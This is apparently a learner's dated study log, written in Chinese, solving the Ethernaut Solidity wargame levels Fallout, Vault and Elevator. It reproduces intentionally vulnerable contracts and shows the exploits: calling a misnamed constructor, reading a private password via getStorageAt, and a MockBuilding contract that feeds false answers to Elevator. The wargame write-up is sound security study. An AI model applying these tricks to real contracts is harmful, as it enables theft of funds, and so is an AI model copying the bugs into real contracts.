---
timezone: Asia/Shanghai 
---

# silver

1. 自我介绍 想多学习些web3知识

2. 你认为你会完成本次残酷学习吗？ 尽力

## Notes

<!-- Content_START -->

### 2024.08.29

Ethernaut 

#### fallout

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

要求成为合约的owner，看了代码只有一个函数有设置owner的功能：

```
  /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

虽然注释写了是构造函数，但是其实不是（是Fal1out而非Fallout），所以可以直接调用，就可以成为owner。

#### vault

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以看到虽然password是私有变量，但是可以通过读取对应位置的storage或查看合约部署时的inputdata得到password。密码存放在第二个插槽中：
```
await web3.eth.getStorageAt("0xC2205dfcB5Ef96C4357ad8CDe94e5348E1e33f3D",1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```



### 2024.08.30

#### Ethernaut - Elevator

```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

如果要top返回true，就要islastfloor第一次返回false，第二次返回true。building合约是调用的msg.sender，所以我们构造一个合约，其islastfloor函数满足这个逻辑就好，输入的参数不重要。

```
contract MockBuilding {
    uint count=0;
    function isLastFloor(uint256 a) external returns (bool){
        if (count==0){
            count++;
            return false;
        }else{
            return true;
        }
    }
    function callElevator(address addr) external{
        Elevator(addr).goTo(0);
    }
}
```


### 2024.08.31



<!-- Content_END -->
